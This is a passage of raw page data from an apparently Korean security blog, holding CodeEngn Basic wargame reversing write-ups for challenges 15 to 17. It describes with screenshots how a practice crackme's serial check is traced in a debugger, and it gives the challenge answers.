url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB9klEQVR42nXSS28SURQA4Gv5C7Cw5THogj2PfV0QSPgh/AYVaGvBxtadhcEEkFerUZc2LN1VRk0FOth0Fgwt8+LO3DsDzAMXJIZpYvH1LU5Ocm/OOck54OTkgyzLwhLPC7wgCKPRSBBFjDFCCGMMIQyFQgCAtbU18AeKojqd7vXVtWrDtl/5TRKJRAAADocDAHBnBfj65TNzyTCXjKqqk99pmjadThFCwWDwv52/nZ0Nh0NZlkVRlP4CIYzH406XMxAIuFzODbfb6/G4PR73+l3Q6XYGLIsxNgxD13XTNC3L0m2GoVuWibGaTCY3H2wmEoloNBqLxeLx2E0EFxffeZ4fDq9ESZrNdAghx/Gz2bKKqmoyVHTdCIfD/x479ejhXi67u7uzl8s+P9g/2H/2NJfd3so82dnOpFPp1OOtTDoSDrk31v2Ez094/YSX8Hnv3yMInxe8LJKNeq1cLlUrlVeVcq1arZRKRbJQOHxBFg6LZJ7M5+u16pvXx8fN5lGzcdRsNBv19+/ekoUC4DkOYzy2KbJi71zUtAmEsoKQijFSkCSOFYSk8ZgXBI5b3oKmTs5pGvA8P5//MMxVlmmaClJYdjBgWUmSrLllGLdfdF1fLBY0TYNPp6f9fr/X652voGmaoqiPtna7TdP06mu322UYptVq/QTGxKqFOQwI1gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/9f253961346cd4f0095033d18ba52a01/c9b55/8.webp 165w,\n/static/9f253961346cd4f0095033d18ba52a01/f2908/8.webp 330w,\n/static/9f253961346cd4f0095033d18ba52a01/ad2dd/8.webp 519w\"\n              sizes=\"(max-width: 519px) 100vw, 519px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/9f253961346cd4f0095033d18ba52a01/04c57/8.png 165w,\n/static/9f253961346cd4f0095033d18ba52a01/d9ecf/8.png 330w,\n/static/9f253961346cd4f0095033d18ba52a01/b23ad/8.png 519w\"\n            sizes=\"(max-width: 519px) 100vw, 519px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/9f253961346cd4f0095033d18ba52a01/b23ad/8.png\"\n            alt=\"answer\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>정답: 24673</p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":null,"id":"58836cbf-de05-537f-b038-5347b8e7e195","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-15/","title":"CodeEngn Basic 15","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/ca1457ca924b18573687d14578aa0f38/bf58b/0.png","srcSet":"/static/ca1457ca924b18573687d14578aa0f38/4d08c/0.png 63w,\n/static/ca1457ca924b18573687d14578aa0f38/ea049/0.png 125w,\n/static/ca1457ca924b18573687d14578aa0f38/bf58b/0.png 250w","sizes":"(min-width: 250px) 250px, 100vw"},"sources":[{"srcSet":"/static/ca1457ca924b18573687d14578aa0f38/ca5ef/0.webp 63w,\n/static/ca1457ca924b18573687d14578aa0f38/df328/0.webp 125w,\n/static/ca1457ca924b18573687d14578aa0f38/2d2c6/0.webp 250w","type":"image/webp","sizes":"(min-width: 250px) 250px, 100vw"}]},"width":660,"height":401.28000000000003}}}},"body":"<p>Name이 CodeEngn일때 Serial을 구하시오</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 250px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 89.6969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAIAAADUsmlHAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAChElEQVR42qWRW28aVxSFv0ONz4DnwnAxQ2ZghrnAgAHbYOw2svoc7tg4vjRWlLR1KyuNmqbyT+lDXvJbo5mkSl7aKurSelhnn720tPfm9vb27cPD5cXm+vLi+vLp+Xq1OV9vzpbz6WQ+nawWs+V8Ops8Wc5nz26u59PJbPLkbLV8ujlbzKbcv3711/t3r+5/efjzzds3r+9+fnn304s/fv/th6vNejm7udpcXqxXi+nF+fr+17uz1WI5nz67ufrxxfPVYkY7ajVs1603Pbfpe17Q9EM/aHp+4IdNL/Bc33P9KAxa0WdGaUe/t0epJOsNPJeSST6PukMuR7GEUaBao7qL2yCb5UsIIQBNVdmtKqffc3QkBj1Rr4soFI4tBvui1xPHJ2I8FidjYVVFsSiKZsJKWVjVTKlIuaxhGNK26cT0e0lOu4VTJ46xKnS7hM0kP+4wPKR/wPExdg2zKBwbx1YxTWlVqZTptGlHhD6azmjEboV+n7iVmL0mwyGdDoHPI4ttKXI5nEepOW5h28RtjkbsD/A8Rof4TUZDwjCpRyEHh/S7yVc7IgpFw0mT8zuyUKBgUCgkCzMMDB1dQ9c/CcNItG6gaZhmUjR0oSdaRUrJV+Lzti1LtlrJqeoOqppM5ThUSgz2GQwomklmEDIesRfTjXGdxP7JXK/L8RHD/WRhxTLfHrPXpVbh8XecnDDoJ1cYHlCrEQScnnL6GNNMzZpKPi8VBSXH9jaZLMoO25LMN0gFRUmn1ZESIdjaSnqUHNns38kNKUcQpKxCB1wYQhP6sPXvM5ekDCEPKshUyFQrKf9jYYqiZNL3R/AF/wmZTAbQNe3/napcLmmapn8lVFWtWdYH+E9eATiCTY0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ca1457ca924b18573687d14578aa0f38/c9b55/0.webp 165w,\n/static/ca1457ca924b18573687d14578aa0f38/1e0be/0.webp 250w\"\n              sizes=\"(max-width: 250px) 100vw, 250px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ca1457ca924b18573687d14578aa0f38/04c57/0.png 165w,\n/static/ca1457ca924b18573687d14578aa0f38/63868/0.png 250w\"\n            sizes=\"(max-width: 250px) 100vw, 250px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ca1457ca924b18573687d14578aa0f38/63868/0.png\"\n            alt=\"crakme\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>Name과 Serial을 CLI로 입력하는 프로그램이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 418px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.96969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB9UlEQVR42k2R227TQBCG/ZiQJmlaIYQQClc8AM9ULkl8KDFxUbL1+pR4vSd7D6F2snYKvUZOAOW7GP0zmvmlmbHefvo8nU6n7999nH6YXA9HV4PxcDAeneJwMLp6fRbj4eB2Mh4PBzfj0XDw6s3t5OZ6ZHn3CwCAYzuu48zn8/ls5rmubTue685nM3/he57nzG3Pu5/NvrqOa9u2v/i2XC6/3N1ZQsiu67TWSimttRRSiIrzUkpVllVfUUpKudNaCCGl4pzv+m79CIBVFEWBCiFkyfl2s+Wct217vKASkhDczylZVeL5+ZcxZr9vsiyz0jSDIcxRgYsCrNbbbd62rbmAMR7HMUIFo3Rzcq/rZrfbAQCsPEcoR5RxjHEcxZSy/X5vjGn/UZYi22SUMkIIhDCCkFH29PQUhqG1zRFCiFLGeam1fnn53V1wPB4ZZVmaUUoZ4/2KOSoK3DRNFEXWz53uus4YczgcjGnrC5qmqevatOZ47I3+3+KcEIKtCMI8RwTjNE0xJkmcgPUjhFEUwThOsiQF4LGqqsPhcPaqT7HrOoyxhfJ8tVpDGHFe4gIDANarNWP9P4JlECepUqo+bZhlG6VU0+zTJGGM99d+CALf94Pl94eHH7zkhBCCccl5WZYnTURV/dWEVFVFKQ2CIAxDf7H4A0LmH3ERKpycAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/bb6a53d3dc4635190e8746ecdd9e56ca/c9b55/1.webp 165w,\n/static/bb6a53d3dc4635190e8746ecdd9e56ca/f2908/1.webp 330w,\n/static/bb6a53d3dc4635190e8746ecdd9e56ca/cd572/1.webp 418w\"\n              sizes=\"(max-width: 418px) 100vw, 418px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/bb6a53d3dc4635190e8746ecdd9e56ca/04c57/1.png 165w,\n/static/bb6a53d3dc4635190e8746ecdd9e56ca/d9ecf/1.png 330w,\n/static/bb6a53d3dc4635190e8746ecdd9e56ca/d7398/1.png 418w\"\n            sizes=\"(max-width: 418px) 100vw, 418px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/bb6a53d3dc4635190e8746ecdd9e56ca/d7398/1.png\"\n            alt=\"PEiD\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>PEiD로 보면 패킹은 되어있지 않음을 알 수 있다. 그대로 분석을 진행한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB3klEQVR42mXQ227TQBQF0OOJ7fg6F881djIee3xJm7SlIFpUJKSKR0ShUL6glfghPhiSIh7ofl/aZx/4td99aK1q6mn066Zxn+rVpa63tZSCESZ4xSmJwggAsizjnAshqqrK0hQAoJlH65xWcj7Znk5j/fMHvT0rbBh3y7TJ0jqKGgAMaBHEcQz/ZR59a60xxjlLcDm/uZ7Pz1ZGlKRknFaCFSSEABBCzzg45i/2vrfWaq2GceSkNF++yvevmc1yX+ANFj0vTAIloAotixfN3vebzcasTNc5Y/R8czNcnOqa5TynihQigzVAAwEJ4vQFnsbBta2ScpzGeei7b9/l9SvtGZNMc0kkBgtgIFBBitPwOVEUhuERT4NzrVJynIaxd/3nO/P23HjOJFVCUk3AHTBYEGtOs5zlGad0mSTPeHSu1UpuT7az79z9vbq+0J5RRaUQVBFoj7iGlVN1Uao4ThD6t7mz1kopp3mafdc+PKh3l6qjRFDFBJYlbADUYbauhU5zFYUpQmixOPy87117wOJ0t9v2rXl8IrdX1CVZkxODkzYBDUABBEgtNCVrKSpKMMEIoUNza63Sarffn3inH5/wxyvil9mQY4+T/RFjAA6kokVZFGWBMQ7DxZ+zfwOGyTR1jUW/dAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/1d7667977e7e052cd27c51af2e60c58e/c9b55/2.webp 165w,\n/static/1d7667977e7e052cd27c51af2e60c58e/f2908/2.webp 330w,\n/static/1d7667977e7e052cd27c51af2e60c58e/ff4b8/2.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/1d7667977e7e052cd27c51af2e60c58e/04c57/2.png 165w,\n/static/1d7667977e7e052cd27c51af2e60c58e/d9ecf/2.png 330w,\n/static/1d7667977e7e052cd27c51af2e60c58e/32056/2.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/1d7667977e7e052cd27c51af2e60c58e/32056/2.png\"\n            alt=\"0040159F\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 47.27272727272727%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABkUlEQVR42mWPa2ucQBhGXyVeR1fn4jgXdZwZdWnK0gtNd9ts02YhCSwNgX4p9P//kCCBEtrz/XCeBz5dfTwer/f7/eGw//b1cHh6ND/PfKDUU2qo8Ny+09POWWvneTbGjK8AIbmzoxByHA0jdTt7f3NsDc5lhnhecBThECIIwzCOY/iHwfTb7aK0vnx7qXmjPrw3j+fWEOwwMVh5UbcIMohIlJZpAEH4Cuh6vSyTUmqefKeE3e2m6y/SsFIWFd8UvIAeYISwDuPsv3Lf63mepJRu8rMzb0636vwgpoZ1TdvwpqXBEICGUIYIoyiK4zRNswwhtL7oeu29E0L4yW+dXb7fyIc77gkZaMMYaWsYACRAH/CONlnOUV5vNuWmTJIElBIv8mhH22v3+UqdfvCBEr3KjJO1rAAUtLrhOaovLsK/s5WSzlkpxWCGxY7+dMt+PRFTVrrCFS5osWYZQAtCNDLLNMpRkqRZuspay3nyYpXNdjT2/g7/+V0PqHSb2lRoRmsWAzTAWkYwppRWVZWmq/wMZlUvv79hTswAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/08a56a6150dea5b6906853598eae4780/c9b55/3.webp 165w,\n/static/08a56a6150dea5b6906853598eae4780/f2908/3.webp 330w,\n/static/08a56a6150dea5b6906853598eae4780/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/08a56a6150dea5b6906853598eae4780/04c57/3.png 165w,\n/static/08a56a6150dea5b6906853598eae4780/d9ecf/3.png 330w,\n/static/08a56a6150dea5b6906853598eae4780/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/08a56a6150dea5b6906853598eae4780/32056/3.png\"\n            alt=\"0040163C\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>정답을 판별하는 부분이다. EAX와 LOCAL.15의 값을 비교하여 그 둘이 같을 시 정답으로 판별하는 것을 볼 수 있다. LOCAL.15는 지역변수 값으로 스택에서 확인할 수 있으므로 실행시켜가면서 그곳에 어떤 값이 확인하고자 한다. 다음은 CodeEngn과 12345를 입력했을 시 LOCAL.15에 들어가 있는 값이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 227px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABlElEQVR42iXNPW/TQACA4TP5UhXs3l3u7HPir/hsn30+22kbiQxtUGgY0lIWKIqExFAJWCr1RzSVCAqEgQ4dGsSExJ9CDCz9Fajqs796wR0A/wC407Q/APy17V83N1fL5fLT8naz+bG5/bZef7++Xq+/Xl4uFovFarV6Pj45KEfn7z9OJofgQweeQeOdYZxBeMH52zenRVUNh8NXr0/n8/nT8f7R7OjlyfF0OjmcPnsxm/mfQ/KzE81CK+sCFvrUc0zPZUksB/cAAK1GI+BRmgkEDcbsLI2F4LHgu6rQv+j13/X6XqPm1wHFEBk6xZBilPAwiqJ2u02p2e8Hts3CMKC003W8RAghC6lU0I184j7e0k1iAqWkLErfd+G2XhaZ6/ZkoQ7G+3kuu7ZVlGq3UmkaS5Xv7QwIRgAATdPAg9HoSTUoRcJTEaaZSOJIZhlCKIl5oXLH6ZU7VRQGut72XC8vFO/7GONHtdp97DguxgihbdJBhBBKqUVpo9lkttVzesy2wogzy2y1mpRSxhjBGGH4MP8PE3BJzMz/C5IAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/4b18631072eebae346df3bbad4f50933/c9b55/4.webp 165w,\n/static/4b18631072eebae346df3bbad4f50933/7d72c/4.webp 227w\"\n              sizes=\"(max-width: 227px) 100vw, 227px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/4b18631072eebae346df3bbad4f50933/04c57/4.png 165w,\n/static/4b18631072eebae346df3bbad4f50933/9b5be/4.png 227w\"\n            sizes=\"(max-width: 227px) 100vw, 227px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/4b18631072eebae346df3bbad4f50933/9b5be/4.png\"\n            alt=\"3838184855\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>E4C60D97은 십진수로 3838184855이다. 그래서 프로그램을 재실행 시킨 후 CodeEngn과 3838184855를 입력해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 285px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 64.84848484848484%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACY0lEQVR42pWQ204TURSG/92RsRC1c+js2XNop6VMO52eoKWSoKEc26FQeuKgIOWgKKn22hsTH0fjSxgJifERDFp9FLPVe+PKulj5s76sf/04Ph0MRy/7vfbBfn+31+l2dvq9dq/b7nZae7vdoLEeNOqbQb2+sdbeaXU7Oxvrq81m0Ou2V1eXcTkavX7z9uzkfDgcng0Gg6OjyxeXF+fPL54+Ozk+bW01d3vtXqe1vRU8Ptg7fLS/3Qz63fbJk8O1lSX4Pq0t3VuoypmMHI+rSUfN+XK5LM9X5cVFuVrWZCkaVTVV1VRFVRWVUn1qaqpR33j3/gOYIfo5lPJIZxCPw7LgZZDLw8si7cJNwbZhmDAYTIPPpiEAaDSCb+MbRDVRkuF7JD1DYjFimsRNE8aI7xODEcMk81WSL5BymWgqEQTC2C0AtdrK1dVHRKMi1RC3UJ3H3Cy/PFvEdBKFImamkUxg4T6KBa5nXH6cUuE3XPt0dY1IRNR1mAyMgerQNDAdlg1KoVPu1uAA1//Y1jQOL9dq15+/QBRF/E8JAoeDRuPrzRi2LToOXBeKQmyLOA6hUVKpkIxH7tzlz5dmST6LXA6JOIQQwmEONzc3v49/IpEQ3RnMlbjbVIqHrEqYq8BL87Q9DzELhoUHD/mOl0WpKFANnc7WePwDhmkwpsuKpCgSYzTuxFzXtSzTtoxUKuY4luMkpYg0MTEhimI4LE5O3gbgZ7OvRiMUS6XKfMXLZrx0Kp/LFgoF2zIjUkSnVOOlapSGwxwghAC/++8AMIOZpmkauqZFdV1TZDlE/h0bISQUCv0CzTJt4g3OAQMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/956539ddf2f0cfe9bb784eb0e2402e3a/c9b55/5.webp 165w,\n/static/956539ddf2f0cfe9bb784eb0e2402e3a/6d56d/5.webp 285w\"\n              sizes=\"(max-width: 285px) 100vw, 285px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/956539ddf2f0cfe9bb784eb0e2402e3a/04c57/5.png 165w,\n/static/956539ddf2f0cfe9bb784eb0e2402e3a/0e2fe/5.png 285w\"\n            sizes=\"(max-width: 285px) 100vw, 285px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/956539ddf2f0cfe9bb784eb0e2402e3a/0e2fe/5.png\"\n            alt=\"crackme\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>EAX와 LOCAL.15의 값을 동일하게 맞추었다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 285px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 64.84848484848484%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACY0lEQVR42pWQ204TURSG/92RsRC1c+js2XNop6VMO52eoKWSoKEc26FQeuKgIOWgKKn22hsTH0fjSxgJifERDFp9FLPVe+PKulj5s76sf/04Ph0MRy/7vfbBfn+31+l2dvq9dq/b7nZae7vdoLEeNOqbQb2+sdbeaXU7Oxvrq81m0Ou2V1eXcTkavX7z9uzkfDgcng0Gg6OjyxeXF+fPL54+Ozk+bW01d3vtXqe1vRU8Ptg7fLS/3Qz63fbJk8O1lSX4Pq0t3VuoypmMHI+rSUfN+XK5LM9X5cVFuVrWZCkaVTVV1VRFVRWVUn1qaqpR33j3/gOYIfo5lPJIZxCPw7LgZZDLw8si7cJNwbZhmDAYTIPPpiEAaDSCb+MbRDVRkuF7JD1DYjFimsRNE8aI7xODEcMk81WSL5BymWgqEQTC2C0AtdrK1dVHRKMi1RC3UJ3H3Cy/PFvEdBKFImamkUxg4T6KBa5nXH6cUuE3XPt0dY1IRNR1mAyMgerQNDAdlg1KoVPu1uAA1//Y1jQOL9dq15+/QBRF/E8JAoeDRuPrzRi2LToOXBeKQmyLOA6hUVKpkIxH7tzlz5dmST6LXA6JOIQQwmEONzc3v49/IpEQ3RnMlbjbVIqHrEqYq8BL87Q9DzELhoUHD/mOl0WpKFANnc7WePwDhmkwpsuKpCgSYzTuxFzXtSzTtoxUKuY4luMkpYg0MTEhimI4LE5O3gbgZ7OvRiMUS6XKfMXLZrx0Kp/LFgoF2zIjUkSnVOOlapSGwxwghAC/++8AMIOZpmkauqZFdV1TZDlE/h0bISQUCv0CzTJt4g3OAQMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/956539ddf2f0cfe9bb784eb0e2402e3a/c9b55/6.webp 165w,\n/static/956539ddf2f0cfe9bb784eb0e2402e3a/6d56d/6.webp 285w\"\n              sizes=\"(max-width: 285px) 100vw, 285px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/956539ddf2f0cfe9bb784eb0e2402e3a/04c57/6.png 165w,\n/static/956539ddf2f0cfe9bb784eb0e2402e3a/0e2fe/6.png 285w\"\n            sizes=\"(max-width: 285px) 100vw, 285px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/956539ddf2f0cfe9bb784eb0e2402e3a/0e2fe/6.png\"\n            alt=\"crack\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>정답 인증에 성공하였다.</p>\n<p>정답: 3838184855</p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":"","id":"5a669ad9-f204-5fbf-89a0-86bec6d15d54","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-16/","title":"CodeEngn Basic 16","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#e8e8e8","images":{"fallback":{"src":"/static/c78f91dae6edf9132e0b3abf733a4a61/73a2e/0.png","srcSet":"/static/c78f91dae6edf9132e0b3abf733a4a61/182cc/0.png 91w,\n/static/c78f91dae6edf9132e0b3abf733a4a61/3a1e1/0.png 182w,\n/static/c78f91dae6edf9132e0b3abf733a4a61/73a2e/0.png 363w","sizes":"(min-width: 363px) 363px, 100vw"},"sources":[{"srcSet":"/static/c78f91dae6edf9132e0b3abf733a4a61/98c2e/0.webp 91w,\n/static/c78f91dae6edf9132e0b3abf733a4a61/89674/0.webp 182w,\n/static/c78f91dae6edf9132e0b3abf733a4a61/b2c59/0.webp 363w","type":"image/webp","sizes":"(min-width: 363px) 363px, 100vw"}]},"width":660,"height":400}}}},"body":"<p>Key 값이 BEDA-2F56-BC4F4368-8A71-870B 일때 Name은 무엇인가\r\n힌트 : Name은 한자리인데.. 알파벳일수도 있고 숫자일수도 있고..\r\n정답인증은 Name의 MD5 해쉬값(대문자)</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 363px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 51.515151515151516%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABeUlEQVR42mWOzXKbMBSFebQa/ySbdtm36yPYGVg0C+xJPdM02zbE001BlgDxI11JxAYq2zQtgmaY9sy3OfecM3Otmf1mbk/GXM2n14tZx3x6ZbhezBZTu08X9mRiT95P7Q/v3lqf7u7WnjfGddzVarVcLh3HcR3HdZ2b1c3tx9vNet0XPM/bbjZft1tLn05a64tR23ZkaRoGAQpRSmkSxymlYYCUUi8vv/pC217O7aXW2gIAacS4yBnkDJhQXJagSi4UM3BZFn/TocNBAFhKqR9B8LT7HvGKH8/F4cQ6dPGs2UGzwf7DmfCjEMKSUgUBQghlXEJ55OoAI7jhf5sy0Y8liSJK0+ey1D+bpq7rqjIc66pqmnp0qZp6sFLAMAaAPM8xJmEYYoypUZZlSZIghAghvU3TdL/HGHe2KAopZTeOoogQ4vv+/ef7p92OEIIxTpJkv0cPXx6+Pfomj+I49n3/0VhK6TAWQgB0b/QCo9cjjPRaEEL8Gf8GpdD14ILSmU8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/c78f91dae6edf9132e0b3abf733a4a61/c9b55/0.webp 165w,\n/static/c78f91dae6edf9132e0b3abf733a4a61/f2908/0.webp 330w,\n/static/c78f91dae6edf9132e0b3abf733a4a61/2ed29/0.webp 363w\"\n              sizes=\"(max-width: 363px) 100vw, 363px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/c78f91dae6edf9132e0b3abf733a4a61/04c57/0.png 165w,\n/static/c78f91dae6edf9132e0b3abf733a4a61/d9ecf/0.png 330w,\n/static/c78f91dae6edf9132e0b3abf733a4a61/4e786/0.png 363w\"\n            sizes=\"(max-width: 363px) 100vw, 363px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/c78f91dae6edf9132e0b3abf733a4a61/4e786/0.png\"\n            alt=\"crackme\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>Name과 Key를 입력하는 프로그램이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 418px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.96969696969697%; position: relative; bottom: 0; left: 0; background-image: 